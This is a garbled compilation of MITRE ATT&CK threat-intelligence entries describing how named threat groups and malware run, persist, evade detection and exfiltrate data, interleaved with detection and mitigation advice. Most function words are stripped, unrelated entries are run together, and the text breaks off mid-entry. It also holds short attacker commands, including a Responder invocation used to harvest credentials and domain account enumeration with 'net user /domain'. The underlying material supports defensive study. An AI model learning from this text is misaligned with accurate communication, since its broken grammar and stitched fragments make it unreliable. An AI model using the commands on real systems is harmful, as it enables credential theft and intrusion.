[Xbash](https://attack.mitre.org/software/S0341) attempt exploit vulnerabilities Hadoop, Redis, ActiveMQ services running conduct execution.(Citation: Unit42 Xbash Sept 2018)(Citation: Trend Micro Xbash Sept 2018) [Lazarus Group](https://attack.mitre.org/groups/G0032) executed [Responder](https://attack.mitre.org/software/S0174) command <code>[Responder file path] -i [IP address] -rPv</code> compromised host harvest credentials laterally.(Citation: Kaspersky ThreatNeedle Feb 2021) [Winnti Linux](https://attack.mitre.org/software/S0430) custom TCP protocol four-byte XOR command control (C2).(Citation: Chronicle Winnti Linux 2019) [SILENTTRINITY](https://attack.mitre.org/software/S0692) create WMI Event execute payload persistence.(Citation: GitHub SILENTTRINITY Modules July 2019) [QakBot](https://attack.mitre.org/software/S0650) laterally worm-like functionality exploitation SMB.(Citation: Crowdstrike Qakbot October 2020) [Patchwork](https://attack.mitre.org/groups/G0040) spearphishing links users click, download malicious files.(Citation: Symantec Patchwork)(Citation: TrendMicro Patchwork Dec 2017)(Citation: Volexity Patchwork June 2018)(Citation: Unit 42 BackConfig 2020) [ZIRCONIUM](https://attack.mitre.org/groups/G0128) malicious links beacons e-mails malware download track hits attacker-controlled URL's.(Citation: Targeting Elections September 2020)(Citation: Google Election Threats October 2020)(Citation: Zscaler APT31 Covid-19 October 2020) [FIN6](https://attack.mitre.org/groups/G0037) Metasploit’s named-pipe impersonation technique escalate privileges.(Citation: FireEye FIN6 Apr 2019) Monitor logging list settings extracted, ex. Windows EID 4798 4799. [Bazar](https://attack.mitre.org/software/S0534) hash resolve API calls runtime.(Citation: Cybereason Bazar July 2020)(Citation: NCC Team9 June 2020) [Bundlore](https://attack.mitre.org/software/S0482) creates key pair <code>ssh-keygen</code> drops newly created user key <code>authorized_keys</code> enable remote login.(Citation: MacKeeper Bundlore Apr 2019) Monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent.  [Cryptoistic](https://attack.mitre.org/software/S0498) ability delete files compromised host.(Citation: SentinelOne Lazarus macOS July 2020) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [Mustang Panda](https://attack.mitre.org/groups/G0129) executed HTA files cmd.exe, batch scripts collection.(Citation: Anomali MUSTANG PANDA October 2019)(Citation: Avira Mustang Panda January 2020) [Peppy](https://attack.mitre.org/software/S0643) ability automatically exfiltrate files keylogs.(Citation: Proofpoint Operation Transparent Tribe March 2016) Restrict permissions access FS server originate privileged access workstations.(Citation: FireEye ADFS) [Deep Panda](https://attack.mitre.org/groups/G0009) <code>-w hidden</code> conceal [PowerShell](https://attack.mitre.org/techniques/T1059/001) windows setting WindowStyle parameter hidden. (Citation: Alperovitch 2014) [Rocke](https://attack.mitre.org/groups/G0106) Pastebin check version beaconing malware redirect Pastebin hosting updated malware.(Citation: Anomali Rocke March 2019) [BitPaymer](https://attack.mitre.org/software/S0570) search network shares domain workgroup <code>net view <host></code>.(Citation: Crowdstrike Indrik November 2018) Monitor suspicious additions `/Library/Security/SecurityAgentPlugins` directory.(Citation: Xorrior Authorization Plugins) [OilRig](https://attack.mitre.org/groups/G0049) macro PowerShell command decode file contents. [OilRig](https://attack.mitre.org/groups/G0049) [certutil](https://attack.mitre.org/software/S0160) decode base64-encoded files victims.(Citation: FireEye APT34 Dec 2017)(Citation: OilRig Delivery Oct 2017)(Citation: Unit 42 OopsIE! Feb 2018)(Citation: Crowdstrike GTR2020 Mar 2020) [Cobalt Strike](https://attack.mitre.org/software/S0154) explore files compromised system.(Citation: Cobalt Strike Manual 4.3 November 2020) [Sidewinder](https://attack.mitre.org/groups/G0121) ActiveXObject utility create OLE objects execution Internet Explorer.(Citation: Rewterz Sidewinder APT April 2020)(Citation: Rewterz Sidewinder COVID-19 June 2020) [RCSession](https://attack.mitre.org/software/S0662) ability drop additional files infected machine.(Citation: Profero APT27 December 2020) [Magic Hound](https://attack.mitre.org/groups/G0059) malware VBS scripts execution.(Citation: Unit 42 Magic Hound Feb 2017) [Revenge RAT](https://attack.mitre.org/software/S0379) collects CPU information, OS information, language.(Citation: Cylance Shaheen Nov 2018) [Metamorfo](https://attack.mitre.org/software/S0455) written process names Registry, disabled browser features, deleted Registry keys, changed ExtendedUIHoverTime key.(Citation: Medium Metamorfo Apr 2020)(Citation: Fortinet Metamorfo Feb 2020)(Citation: FireEye Metamorfo Apr 2018)(Citation: ESET Casbaneiro Oct 2019) [PowerSploit](https://attack.mitre.org/software/S0194) collection Privesc-PowerUp modules discover replace/modify service binaries, paths, configs.(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) [Bundlore](https://attack.mitre.org/software/S0482) Python scripts execute payloads.(Citation: MacKeeper Bundlore Apr 2019) [Carbon](https://attack.mitre.org/software/S0335) establishes persistence creating service naming based operating version running current machine.(Citation: ESET Carbon Mar 2017) [Cuba](https://attack.mitre.org/software/S0625) hardcoded list services processes terminate.(Citation: McAfee Cuba April 2021) [T9000](https://attack.mitre.org/software/S0098) installation process, drops legitimate binary igfxtray.exe. executable side-loading weakness load portion malware.(Citation: Palo Alto T9000 Feb 2016) [EvilGrab](https://attack.mitre.org/software/S0152) capability capture video victim machine.(Citation: PWC Cloud Hopper Technical Annex April 2017) [Peirates](https://attack.mitre.org/software/S0683) initiate port scan IP address.(Citation: Peirates GitHub) [UNC2452](https://attack.mitre.org/groups/G0118) staged data files password-protected archives victim's OWA server.(Citation: Volexity SolarWinds) Modify Registry settings (directly Dcomcnfg.exe) `HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\AppID\\{AppID_GUID}` process-wide security individual applications.(Citation: Process Wide Keys)

Modify Registry settings (directly Dcomcnfg.exe) `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Ole` system-wide security defaults applications set process-wide security.(Citation: Wide Keys) (Citation: ACL) [MacMa](https://attack.mitre.org/software/S1016) malware traces application logs.(Citation: ESET DazzleSpy Jan 2022) [Leviathan](https://attack.mitre.org/groups/G0065) infected victims watering holes.(Citation: CISA AA21-200A APT40 July 2021) [MiniDuke](https://attack.mitre.org/software/S0051) download additional encrypted backdoors victim GIF files.(Citation: Securelist MiniDuke Feb 2013)(Citation: ESET Dukes October 2019) [FatDuke](https://attack.mitre.org/software/S0512) <code>ShellExecuteW</code> default browser URL localhost.(Citation: ESET Dukes October 2019) [LazyScripter](https://attack.mitre.org/groups/G0140) JavaScript attacks.(Citation: MalwareBytes LazyScripter Feb 2021)  Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Malware researchers reverse engineer malware variants DGAs determine future domains malware attempt contact, time resource intensive effort.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA Brute Force) Malware increasingly incorporating seed values unique instance, determined extract future generated domains. cases, seed sample extracted DNS traffic.(Citation: Akamai DGA Mitigation) so, thousands domains generated day; impractical defenders preemptively register C2 domains cost. [FlawedGrace](https://attack.mitre.org/software/S0383) encrypts C2 configuration files AES CBC mode.(Citation: Proofpoint TA505 Jan 2019) [Netwalker](https://attack.mitre.org/software/S0457) detect terminate active security software-related processes infected systems.(Citation: TrendMicro Netwalker 2020)	 [APT3](https://attack.mitre.org/groups/G0022) lured victims clicking malicious links delivered spearphishing.(Citation: FireEye Clandestine Wolf) [Mosquito](https://attack.mitre.org/software/S0256) stores configuration values Registry key <code>HKCU\Software\Microsoft\[dllname]</code> modifies Registry <code>HKCR\CLSID\...\InprocServer32</code>with path launcher.(Citation: ESET Turla Mosquito Jan 2018) adjusting read write permissions NTFS EA, tested ensure routine OS operations impeded. (Citation: InsiderThreat NTFS EA Oct 2017) [Silent Librarian](https://attack.mitre.org/groups/G0122) set auto forwarding rules compromised e-mail accounts.(Citation: DOJ Iran Indictments March 2018) [APT18](https://attack.mitre.org/groups/G0026) actors native [at](https://attack.mitre.org/software/S0110) Windows task scheduler tool scheduled tasks execution victim network.(Citation: Dell Lateral Movement) [NOKKI](https://attack.mitre.org/software/S0353) written %LOCALAPPDATA%\MicroSoft Updatea\svServiceUpdate.exe prior executed process apparent attempt masquerade legitimate folder file.(Citation: Unit 42 NOKKI Sept 2018) (Citation: FireEye APT35 2018) [GoldMax](https://attack.mitre.org/software/S0588) Linux variant crontab entry <code>@reboot</code> gain persistence.(Citation: CrowdStrike StellarParticle January 2022) [Clambling](https://attack.mitre.org/software/S0660) delivered victim's machines malicious e-mail attachments.(Citation: Trend Micro DRBControl February 2020) [Evilnum](https://attack.mitre.org/groups/G0120) malware variant, TerraTV, load malicious DLL TeamViewer directory, original Windows DLL located folder.(Citation: ESET EvilNum July 2020)  [Reaver](https://attack.mitre.org/software/S0172) variants raw TCP C2.(Citation: Palo Alto Reaver Nov 2017) collect information, including name, manufacturer, IsDebuggerPresent state, execution path.(Citation: FireEye APT37 Feb 2018) Trusted Platform Module technology secure trusted boot process prevent integrity compromised. Check integrity existing BIOS EFI determine vulnerable modification. (Citation: TCG Trusted Platform Module) (Citation: TechNet Secure Boot Process) [LightNeuron](https://attack.mitre.org/software/S0395) filenames Exchange Outlook binary configuration files, <code>winmail.dat</code>.(Citation: ESET LightNeuron 2019) [Clop](https://attack.mitre.org/software/S0611) packed avoid detection.(Citation: Mcafee Clop Aug 2019)(Citation: Cybereason Clop Dec 2020) Protect domain controllers ensuring proper security configuration critical servers. [njRAT](https://attack.mitre.org/software/S0385) executed PowerShell commands auto-run registry key persistence.(Citation: Trend Micro njRAT 2018) [DarkWatchman](https://attack.mitre.org/software/S0673) ability enumerate file folder names.(Citation: Prevailion DarkWatchman 2021) [EnvyScout](https://attack.mitre.org/software/S0634) distributed spearphishing email attachment.(Citation: MSTIC Nobelium Toolset 2021) Set policies restrict file permissions <code>~/launchagents</code> folder.(Citation: piazza launch agent mitigation) [Kevin](https://attack.mitre.org/software/S1020) exfiltrate data C2 server 27-character chunks.(Citation: Kaspersky Lyceum October 2021) UAC's privilege elevation standard users <code>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]</code> automatically deny elevation requests, add: <code>"ConsentPromptBehaviorUser"=dword:00000000</code>. enabling installer detection users adding: <code>"EnableInstallerDetection"=dword:00000001</code>. prompt password installation log attempt. disable installer detection, add: <code>"EnableInstallerDetection"=dword:00000000</code>. prevent potential elevation privileges exploitation process UAC detecting installer, installation process continue logged.  (Citation: Executable Installers Vulnerable) [APT29](https://attack.mitre.org/groups/G0016) renamed software DLL's legitimate names benign.(Citation: Volexity SolarWinds)(Citation: Analyzing Solorigate Dec 2020)(Citation: SentinelOne NobleBaron June 2021) [Chaes](https://attack.mitre.org/software/S0631) exfiltrated collected data infected machine C2, MIME protocol.(Citation: Cybereason Chaes Nov 2020)  [Bazar](https://attack.mitre.org/software/S0534) perform check ensure operating system's keyboard language settings set Russian.(Citation: NCC Team9 June 2020) [Industroyer](https://attack.mitre.org/software/S0604)’s data wiper component enumerates specific files Windows drives.(Citation: ESET Industroyer) (Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: FireEye APT10 April 2017)(Citation: DOJ APT10 Dec 2018) [ShimRat](https://attack.mitre.org/software/S0444) impersonate Windows services antivirus products avoid detection compromised systems.(Citation: FOX-IT 2016 Mofang) [AuTo Stealer](https://attack.mitre.org/software/S1029) exfiltrate data actor-controlled C2 servers TCP.(Citation: MalwareBytes SideCopy Dec 2021) Ensure local administrator accounts complex, unique passwords systems network. [Kimsuky](https://attack.mitre.org/groups/G0094) created accounts <code>net user</code>.(Citation: KISA Operation Muzabi) [CostaRicto](https://attack.mitre.org/campaigns/C0004), threat actors C2 servers managed [Tor](https://attack.mitre.org/software/S0183).(Citation: BlackBerry CostaRicto November 2020) [Machete](https://attack.mitre.org/software/S0409) FTP Command & Control.(Citation: ESET Machete July 2019)(Citation: Cylance Machete Mar 2017)(Citation: 360 Machete Sep 2020) [RTM](https://attack.mitre.org/groups/G0048) modified version TeamViewer Remote Utilities remote access.(Citation: IB RTM August 2019) Ensure application component binaries signed correct application developers. [Silence](https://attack.mitre.org/groups/G0091) weaponized CHM files phishing campaigns.(Citation: Cyber Forensicator Silence Jan 2019)(Citation: SecureList Silence Nov 2017)(Citation: IB Silence Aug 2019)(Citation: IB Silence Sept 2018) [Cyclops Blink](https://attack.mitre.org/software/S0687) modify Linux iptables firewall enable C2 communication stored list port numbers.(Citation: NCSC Cyclops Blink February 2022)(Citation: Trend Micro Cyclops Blink March 2022) Monitor <code>/etc/profile</code> <code>/etc/profile.d</code>, files modified administrators. MacOS users leverage Endpoint Security Framework file events monitoring specific files.(Citation: ESF_filemonitor) Monitor Registry values IFEOs, silent process exit monitoring, modifications correlate software, patch cycles, etc. (Citation: ESET Crutch December 2020)(Citation: Talos TinyTurla September 2021) [gh0st RAT](https://attack.mitre.org/software/S0032) variant DLL side-loading.(Citation: Arbor Musical Chairs Feb 2018) Anti-virus detect malicious documents files downloaded executed user's computer. Endpoint sensing network sensing detect malicious events file (such Word document PDF reaching internet spawning powershell.exe). Monitor file creation files named partial directories locations searched common processes environment variable, user writable. Also, monitor file creation programs named Windows programs programs commonly executed path (such "findstr," "net," "python"). activity occurs administration activity, upgrades, installations, patches, suspicious. [gh0st RAT](https://attack.mitre.org/software/S0032) remote execute commands.(Citation: FireEye Hacking Team)(Citation: Nccgroup Gh0st April 2018) [EnvyScout](https://attack.mitre.org/software/S0634) deobfuscate write malicious ISO files disk.(Citation: MSTIC Nobelium Toolset 2021) commands modify ACLs file/directory ownership built-in utilities generate false positive alert rate, compare baseline knowledge systems typically correlate modification events indications malicious activity possible. Commonly abused command arguments include <code>chmod +x</code>, <code>chmod -R 755</code>, <code>chmod 777</code>.(Citation: 20 macOS Common Tools Techniques) [Avenger](https://attack.mitre.org/software/S0473) ability communication C2.(Citation: Trend Micro Tick November 2019) Cloud service discovery techniques occur operation adversary targeting cloud-based systems services. Data events viewed isolation, chain behavior lead activities based obtained.
Normal, benign network events cloud service discovery uncommon, depending environment used. Monitor cloud service usage anomalous behavior adversarial presence environment. Employ network segmentation sensitive domains.(Citation: Harmj0y Domain Trusts). [Chimera](https://attack.mitre.org/groups/G0114) staged stolen data locally compromised hosts.(Citation: NCC Chimera January 2021) (Citation: CrowdStrike Ryuk January 2019)(Citation: Red Canary Hospital Thwarted Ryuk October 2020)(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020)(Citation: FireEye KEGTAP SINGLEMALT October 2020)(Citation: DFIR Ryuk's Return October 2020)(Citation: DFIR Ryuk 2 Hour Speed November 2020)(Citation: DFIR Ryuk 5 Hours October 2020)(Citation: Sophos Ryuk Attack October 2020)(Citation: CrowdStrike Wizard Spider October 2020) [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) distributed ransomware backdooring software installers strategic compromise hosting Italian WinRAR.(Citation: Secureworks REvil September 2019)(Citation: Secureworks GandCrab REvil September 2019)(Citation: Secureworks GOLD SOUTHFIELD) [SPACESHIP](https://attack.mitre.org/software/S0035) achieves persistence creating shortcut current user's Startup folder.(Citation: FireEye APT30) [Turla](https://attack.mitre.org/groups/G0010) <code>net user /domain</code> enumerate domain accounts.(Citation: ESET ComRAT 2020) [ROKRAT](https://attack.mitre.org/software/S0240) Visual Basic execution.(Citation: Malwarebytes RokRAT VBA January 2021) [Zebrocy](https://attack.mitre.org/software/S0251) SMTP POP3 C2.(Citation: Palo Alto Sofacy 06-2018)(Citation: Unit42 Cannon Nov 2018)(Citation: ESET Zebrocy Nov 2018)(Citation: Unit42 Sofacy Dec 2018)(Citation: ESET Zebrocy 2019)(Citation: Accenture SNAKEMACKEREL Nov 2018) [FIN8](https://attack.mitre.org/groups/G0061) <code>sslip.io</code>, IP domain mapping service SSL certificate generation easier traffic encryption, command control.(Citation: Bitdefender FIN8 July 2021) [Attor](https://attack.mitre.org/software/S0438) plugin collects inserted storage devices, modems, phone devices.(Citation: ESET Attor Oct 2019) Monitor additions mechanisms trigger autostart execution, relevant additions Registry. multi-factor authentication cloud accounts, privileged accounts. implemented variety forms (e.g. hardware, virtual, SMS), audited administrative reporting features.(Citation: AWS - IAM Console Practices) [More_eggs](https://attack.mitre.org/software/S0284)'s payload encrypted key hostname processor family appended end.(Citation: ESET EvilNum July 2020) (Citation: DFIR Conti Bazar Nov 2021) [Elise](https://attack.mitre.org/software/S0081) encrypts files, including configuration files.(Citation: Lotus Blossom Jun 2015) Monitor newly constructed network connections (typically port 3389) [Valid Accounts](https://attack.mitre.org/techniques/T1078) log Remote Desktop Protocol (RDP). adversary perform actions logged-on user. factors, access patterns activity occurs remote login, suspicious malicious behavior RDP. [Dridex](https://attack.mitre.org/software/S0384) encrypted traffic RSA.(Citation: Kaspersky Dridex 2017) Monitor executed commands arguments attempt subvert Kerberos authentication stealing forging Kerberos tickets enable [Pass Ticket](https://attack.mitre.org/techniques/T1550/003). [Bundlore](https://attack.mitre.org/software/S0482) <code>openssl</code> decrypt AES encrypted payload data. [Bundlore](https://attack.mitre.org/software/S0482) base64 RC4 hardcoded key deobfuscate data.(Citation: MacKeeper Bundlore Apr 2019) [ZxShell](https://attack.mitre.org/software/S0412) command, ps, listing processes system.(Citation: Talos ZxShell Oct 2014)  [Threat Group-3390](https://attack.mitre.org/groups/G0027) tool create service, naming config information, gain persistence.(Citation: Nccgroup Emissary Panda 2018) Monitor files viewed isolation steal data exfiltrating symmetrically encrypted network protocol existing command control channel. [DnsSystem](https://attack.mitre.org/software/S1021)  direct queries custom DNS servers return C2 commands TXT records.(Citation: Zscaler Lyceum DnsSystem June 2022) [Kessel](https://attack.mitre.org/software/S0487) maliciously altered OpenSSH binary targeted systems create backdoor.(Citation: ESET ForSSHe December 2018) [Metamorfo](https://attack.mitre.org/software/S0455) downloaded zip file execution system.(Citation: Medium Metamorfo Apr 2020)(Citation: FireEye Metamorfo Apr 2018)(Citation: Fortinet Metamorfo Feb 2020)  Ensure operating systems browsers current version.  (Citation: US-CERT TA18-074A)(Citation: Core Security Impacket) [APT3](https://attack.mitre.org/groups/G0022) tool exfiltrates data C2 channel.(Citation: FireEye Clandestine Fox) (Citation: CISA AA20-259A Iran-Based Actor September 2020) [Operation Sharpshooter](https://attack.mitre.org/campaigns/C0013), threat actors staged malicious files Dropbox websites.(Citation: McAfee Sharpshooter December 2018) [jRAT](https://attack.mitre.org/software/S0283) list manage startup entries.(Citation: Kaspersky Adwind Feb 2016) [Grandoreiro](https://attack.mitre.org/software/S0531) collect OS version compromised host.(Citation: ESET Grandoreiro April 2020) [AuTo Stealer](https://attack.mitre.org/software/S1029) communicate C2 servers.(Citation: MalwareBytes SideCopy Dec 2021) Monitor detect authorized_keys file user system. Monitor suspicious processes modifiying /etc/ssh/sshd_config. Ensure containers running root default unnecessary privileges mounted components. Kubernetes environments, defining Pod Security Policy prevents pods running privileged containers.(Citation: Kubernetes Hardening Guide) [Threat Group-3390](https://attack.mitre.org/groups/G0027) compromised party service providers gain access victim's environments.(Citation: Profero APT27 December 2020) [Brave Prince](https://attack.mitre.org/software/S0252) gathers file directory victim’s machine.(Citation: McAfee Gold Dragon) [Ixeshe](https://attack.mitre.org/software/S0015) enumerates IP address, network proxy settings, domain victim's system.(Citation: Trend Micro IXESHE 2012) [LazyScripter](https://attack.mitre.org/groups/G0140) dynamic DNS providers create legitimate-looking subdomains C2.(Citation: MalwareBytes LazyScripter Feb 2021) (Citation: Unit42 SilverTerrier 2018) [Heyoka Backdoor](https://attack.mitre.org/software/S1027) enumerate drives compromised host.(Citation: SentinelOne Aoqin Dragon June 2022) UAC bypass techniques exist, prudent enforcement level UAC mitigate bypass opportunities exist techniques [DLL Search Hijacking](https://attack.mitre.org/techniques/T1574/001). [Sandworm Team](https://attack.mitre.org/groups/G0034)'s CredRaptor tool collect saved passwords internet browsers.(Citation: ESET Telebots Dec 2016) Monitor access NTDS.dit. [Micropsia](https://attack.mitre.org/software/S0339) collects username victim’s machine.(Citation: Talos Micropsia June 2017) [TEARDROP](https://attack.mitre.org/software/S0560) modified Registry create Windows service compromised host.(Citation: Check Sunburst Teardrop December 2020) Monitor newly constructed network connections received untrusted hosts.  [FlawedAmmyy](https://attack.mitre.org/software/S0381) PowerShell execute commands.(Citation: Korean FSI TA505 2020) (Citation: IB APT 41 June 2021) [Gamaredon Group](https://attack.mitre.org/groups/G0047) malware insert malicious macros documents <code>Microsoft.Office.Interop</code> object.(Citation: ESET Gamaredon June 2020)	 (Citation: APT15 Intezer June 2018) Monitor analyze application programming interface (API) calls indicative Registry edits, <code>RegCreateKeyEx</code> <code>RegSetValueEx</code>. (Citation: Elastic Process Injection July 2017) [OLDBAIT](https://attack.mitre.org/software/S0138) collects credentials Internet Explorer, Mozilla Firefox, Eudora.(Citation: FireEye APT28) [SodaMaster](https://attack.mitre.org/software/S0627) enumerate host OS version target system.(Citation: Securelist APT10 March 2021) [Threat Group-3390](https://attack.mitre.org/groups/G0027) actors [NBTscan](https://attack.mitre.org/software/S0590) discover vulnerable systems.(Citation: Dell TG-3390) [Squirrelwaffle](https://attack.mitre.org/software/S1030) distributed malicious Office documents spam emails.(Citation: Netskope Squirrelwaffle Oct 2021) (Citation: Recorded Future RedEcho Feb 2021) [DCSrv](https://attack.mitre.org/software/S1033) encrypted drives core encryption mechanism DiskCryptor.(Citation: Checkpoint MosesStaff Nov 2021) [Tropic Trooper](https://attack.mitre.org/groups/G0081) exfiltrated data USB storage devices.(Citation: TrendMicro Tropic Trooper 2020)	 [RTM](https://attack.mitre.org/software/S0148) search specific strings browser tabs Dynamic Data Exchange mechanism.(Citation: ESET RTM Feb 2017) Monitor API calls attempt listing software software versions installed cloud environment. [Kobalos](https://attack.mitre.org/software/S0641) record IP address target machine.(Citation: ESET Kobalos Jan 2021) [Sibot](https://attack.mitre.org/software/S0589) WMI discover network connections configurations. [Sibot](https://attack.mitre.org/software/S0589) Win32_Process class execute malicious DLL.(Citation: MSTIC NOBELIUM Mar 2021) Monitor email gateways scan internal email, organization leverage journaling-based solution sends emails security service offline analysis incorporate service-integrated solutions on-premise API-based integrations detect internal spearphishing attacks.(Citation: Trend Micro Phishing Starts 2017) [Avenger](https://attack.mitre.org/software/S0473) ability XOR encrypt files C2.(Citation: Trend Micro Tick November 2019) [EnvyScout](https://attack.mitre.org/software/S0634) Base64 encode payloads.(Citation: MSTIC Nobelium Toolset 2021) executable version [Helminth](https://attack.mitre.org/software/S0170) module log keystrokes.(Citation: Palo Alto OilRig 2016) [Ferocious](https://attack.mitre.org/software/S0679) ability Visual Basic scripts execution.(Citation: Kaspersky WIRTE November 2021) [CostaRicto](https://attack.mitre.org/campaigns/C0004), threat actors [SombRAT](https://attack.mitre.org/software/S0615) conjuction [CostaBricks](https://attack.mitre.org/software/S0614) [PowerSploit](https://attack.mitre.org/software/S0194).(Citation: BlackBerry CostaRicto November 2020) [Lazarus Group](https://attack.mitre.org/groups/G0032) malware families gather list running processes victim send C2 server. Destover-like variant [Lazarus Group](https://attack.mitre.org/groups/G0032) gathers process times.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Loaders)(Citation: McAfee Lazarus Resurfaces Feb 2018)(Citation: McAfee GhostSecret)(Citation: TrendMicro macOS Dacls 2020)(Citation: Lazarus APT January 2022) [SynAck](https://attack.mitre.org/software/S0242) parses export tables DLLs locate Windows API functions.(Citation: SecureList SynAck Doppelgänging 2018)(Citation: Kaspersky Lab SynAck 2018) [Industroyer](https://attack.mitre.org/software/S0604) attempts perform CONNECT internal proxy establish tunnel.(Citation: Dragos Crashoverride 2017) (Citation: Unit 42 Inception November 2018) [QUADAGENT](https://attack.mitre.org/software/S0269) VBScripts.(Citation: Unit 42 QUADAGENT July 2018) Monitor newly constructed active directory objects, Windows EID 5137. [APT38](https://attack.mitre.org/groups/G0082) clears Window Event logs Sysmon logs system.(Citation: FireEye APT38 Oct 2018) [Pupy](https://attack.mitre.org/software/S0192) establish persistence systemd service.(Citation: GitHub Pupy) [HIDEDRV](https://attack.mitre.org/software/S0135) rootkit hides operating artifacts.(Citation: ESET Sednit 3) [C0015](https://attack.mitre.org/campaigns/C0015), threat actors downloaded additional tools files compromised network.(Citation: DFIR Conti Bazar Nov 2021) [StreamEx](https://attack.mitre.org/software/S0142) ability modify Registry.(Citation: Cylance Crew Feb 2017) [netsh](https://attack.mitre.org/software/S0108) set proxy tunnel remote host access infected host.(Citation: Securelist fileless attacks Feb 2017) [SynAck](https://attack.mitre.org/software/S0242) enumerates Registry event logs.(Citation: SecureList SynAck Doppelgänging 2018) [Tropic Trooper](https://attack.mitre.org/groups/G0081) created shortcuts Startup folder establish persistence.(Citation: Anomali Pirate Panda April 2020)(Citation: TrendMicro Tropic Trooper 2020) [WellMess](https://attack.mitre.org/software/S0514) communicate C2 mutual TLS client server mutually check certificates.(Citation: PWC WellMess July 2020)(Citation: PWC WellMess C2 August 2020)(Citation: CISA WellMess July 2020)(Citation: NCSC APT29 July 2020) Monitor processes unusual activity process network so, abnormal process trees). Track library metadata, hash, compare libraries loaded process execution time previous executions detect differences correlate patching updates. Leverage services Content Delivery Networks (CDN) providers specializing DoS mitigations filter traffic upstream services.(Citation: CERT-EU DDoS March 2017) Filter boundary traffic blocking source addresses sourcing attack, blocking ports targeted, blocking protocols transport. periodic review accounts privileges critical sensitive SharePoint repositories. [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), threat actors uploaded stolen files C2 servers.(Citation: McAfee Honeybee) Monitor newly executed processes execute malicious payloads hijacking binaries services. [WINERACK](https://attack.mitre.org/software/S0219) enumerate active windows.(Citation: FireEye APT37 Feb 2018) [APT28](https://attack.mitre.org/groups/G0007) delivered [JHUHUGIT](https://attack.mitre.org/software/S0044) [Koadic](https://attack.mitre.org/software/S0250) executing PowerShell commands DDE Word documents.(Citation: McAfee APT28 DDE1 Nov 2017)(Citation: McAfee APT28 DDE2 Nov 2017)(Citation: Palo Alto Sofacy 06-2018) Configure access controls firewalls limit access critical systems domain controllers. cloud environments support separate virtual private cloud (VPC) instances enable segmentation cloud systems. [BISCUIT](https://attack.mitre.org/software/S0017) command collect processor type, operation system, name, uptime, laptop PC.(Citation: Mandiant APT1 Appendix) [Tropic Trooper](https://attack.mitre.org/groups/G0081) started service target host wait adversary connect, acting shell.(Citation: TrendMicro Tropic Trooper 2020)	 [spwebmember](https://attack.mitre.org/software/S0227) enumerate dump SharePoint.(Citation: NCC APT15 Alive Strong) [MacMa](https://attack.mitre.org/software/S1016) manage remote screen sessions.(Citation: ESET DazzleSpy Jan 2022) [Carbanak](https://attack.mitre.org/software/S0030) lists running processes.(Citation: FireEye CARBANAK June 2017) [Downdelph](https://attack.mitre.org/software/S0134) bypasses UAC escalate privileges custom “RedirectEXE” shim database.(Citation: ESET Sednit 3) privileged accounts day-to-day operations expose potential adversaries unprivileged systems. Policy disable screensavers unnecessary.(Citation: TechNet Screensaver GP) [Threat Group-3390](https://attack.mitre.org/groups/G0027) downloaded additional malware tools, including `certutil`, compromised host .(Citation: Dell TG-3390)(Citation: Trend Micro DRBControl February 2020) [QakBot](https://attack.mitre.org/software/S0650) ability check running processes.(Citation: ATT QakBot April 2021) Ensure <code>AllowReversiblePasswordEncryption</code> property set disabled application requirements.(Citation: store_pwd_rev_enc) Network intrusion detection prevention systems identify traffic patterns indicative AiTM activity mitigate activity network level. [APT28](https://attack.mitre.org/groups/G0007) changed extensions files exfiltrated data benign, renamed instance legitimate OWA page.(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) [Lazarus Group](https://attack.mitre.org/groups/G0032) performed brute force attacks administrator accounts.(Citation: ESET Lazarus Jun 2020) [OopsIE](https://attack.mitre.org/software/S0264) checks CPU fan, temperature, mouse, hard disk, motherboard anti-VM checks.(Citation: Unit 42 OilRig Sept 2018) Ensure proper permissions directory access control set deny users ability write files top-level directory <code>C:</code> directories, <code>C:\Windows\</code>, reduce malicious files execution. Require executables write-protected directories. [TA551](https://attack.mitre.org/groups/G0127) encoded ASCII initial C2 communications.(Citation: Unit 42 Valak July 2020) [Cobalt Strike](https://attack.mitre.org/software/S0154) custom command control protocol encapsulated DNS. protocols standard assigned ports.(Citation: cobaltstrike manual)(Citation: Talos Cobalt Strike September 2020)(Citation: Cobalt Strike Manual 4.3 November 2020)	 [Maze](https://attack.mitre.org/software/S0449) forged POST strings random choice list possibilities including "forum", "php", "view", etc. connection C2, hindering detection efforts.(Citation: McAfee Maze March 2020) Monitor abnormal LDAP queries filters <code>groupPolicyContainer</code> volumes LDAP traffic domain controllers. Windows Event 4661 detect directory service accessed. [StrongPity](https://attack.mitre.org/software/S0491) executed compromised installation files legitimate software including compression applications, security software, browsers, file recovery applications, tools utilities.(Citation: Talos Promethium June 2020)(Citation: Bitdefender StrongPity June 2020) [Doki](https://attack.mitre.org/software/S0600) downloaded scripts C2.(Citation: Intezer Doki July 20) Monitor windows registry values delete alter generated artifacts persistence host system. [DustySky](https://attack.mitre.org/software/S0062) dropper Windows Management Instrumentation extract operating anti-virus active.(Citation: DustySky) [Patchwork](https://attack.mitre.org/groups/G0040) scanned “Program Files” directories directory string “Total Security” (the installation path “360 Total Security” antivirus tool).(Citation: Cymmetria Patchwork) process monitoring monitor execution arguments odbcconf.exe. Compare invocations odbcconf.exe prior history arguments loaded DLLs determine anomalous adversarial activity. Enable security auditing collect logs hybrid identity solutions. example, monitor sign-ins Azure Application Proxy Connector, typically generated PTA Agent added. (Citation: Mandiant Azure Backdoors) FS use, review logs event 501, specifies EKU attributes claim, raise alerts values configured environment.(Citation: MagicWeb) [APT41](https://attack.mitre.org/groups/G0096) compromised account create scheduled task system.(Citation: FireEye APT41 Aug 2019)(Citation: Crowdstrike GTR2020 Mar 2020) [Denis](https://attack.mitre.org/software/S0354) compressed collected data zlib.(Citation: Securelist Denis April 2017) [Earth Lusca](https://attack.mitre.org/groups/G1006) 